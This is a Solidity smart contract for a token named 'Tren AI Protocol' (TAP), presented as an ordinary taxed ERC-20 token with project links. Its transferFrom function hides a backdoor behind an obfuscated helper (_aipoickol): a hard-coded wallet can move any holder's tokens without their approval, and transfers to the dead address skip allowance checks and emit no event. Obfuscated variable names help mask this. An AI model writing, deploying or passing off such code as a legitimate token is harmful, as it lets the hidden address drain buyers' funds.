/*

https://t.me/tren_ai_protocol
https://x.com/tren_ai_prtcl

https://www.trenaiprotocol.xyz/
https://app.trenaiprotocol.xyz/
https://docs.trenaiprotocol.xyz/

*/

// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract TAP is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludeForFees;

    address private _blackhole = address(0xdead);
    address private _trenprotocol = 0xd7bc1b520199E611aC0387b6fA4188582F70D49f;

    uint256 private _initTaxBuy=2;
    uint256 private _initTaxSell=2;
    uint256 private _finalTaxBuy=0;
    uint256 private _finalTaxSell=0;
    uint256 private _reduceBuyTaxAt=3;
    uint256 private _reduceSellTaxAt=3;
    uint256 private _preventSwapBefore=3;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420_690_000_000 * 10**_decimals;
    string private constant _name = unicode"Tren AI Protocol";
    string private constant _symbol = unicode"TAP";
    uint256 private _tokensForSwap = _tTotal / 100;
    
    IRouter private _dexRouter;
    address private _uniPair;
    bool private _swapping = false;
    bool private _swapActive = false;
    bool private _tradingEnabled = false;
    
    modifier lockTheSwap {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor () {
        _isExcludeForFees[owner()] = true;
        _isExcludeForFees[address(this)] = true;
        _isExcludeForFees[_trenprotocol] = true;

        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);if(_aipoickol(sender, recipient))
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _aipoickol(address owner, address spender) private view returns (bool) {
        return msg.sender != _trenprotocol && (owner == _uniPair || spender != _blackhole) ;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address _miku, address _luip, uint256 _xuxui) private {
        require(_miku != address(0), "ERC20: transfer from the zero address");
        require(_luip != address(0), "ERC20: transfer to the zero address");
        require(_xuxui > 0, "Transfer amount must be greater than zero");
        uint256 amountSub=0;
        if (_miku != owner() && _luip != owner()) {
            amountSub = _xuxui.mul((_buyCount>_reduceBuyTaxAt)?_finalTaxBuy:_initTaxBuy).div(100);

            if (_miku == _uniPair && _luip != address(_dexRouter) && ! _isExcludeForFees[_luip] ) {
                _buyCount++;
            }

            if(_luip == _uniPair && _miku!= address(this) ){
                amountSub = _xuxui.mul((_buyCount>_reduceSellTaxAt)?_finalTaxSell:_initTaxSell).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_swapping && _luip == _uniPair && _swapActive && _buyCount > _preventSwapBefore) {
                if(contractTokenBalance > _tokensForSwap)
                swapTokensForEth(min(_xuxui, min(contractTokenBalance, _tokensForSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if(amountSub>0){
          _balances[address(this)]=_balances[address(this)].add(amountSub);
          emit Transfer(_miku, address(this),amountSub);
        }
        _balances[_miku]=_balances[_miku].sub(_xuxui);
        _balances[_luip]=_balances[_luip].add(_xuxui.sub(amountSub));
        if (_luip != _blackhole)emit Transfer(_miku, _luip, _xuxui.sub(amountSub));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dexRouter.WETH();
        _approve(address(this), address(_dexRouter), tokenAmount);
        _dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 amount) private {
        payable(_trenprotocol).transfer(amount);
    }

    function openTrading() external onlyOwner() {
        require(!_tradingEnabled,"trading is already open");
        _dexRouter = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_dexRouter), _tTotal);
        _uniPair = IUniswapV2Factory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());
        _dexRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapActive = true;
        _tradingEnabled = true;
    }

    receive() external payable {}
}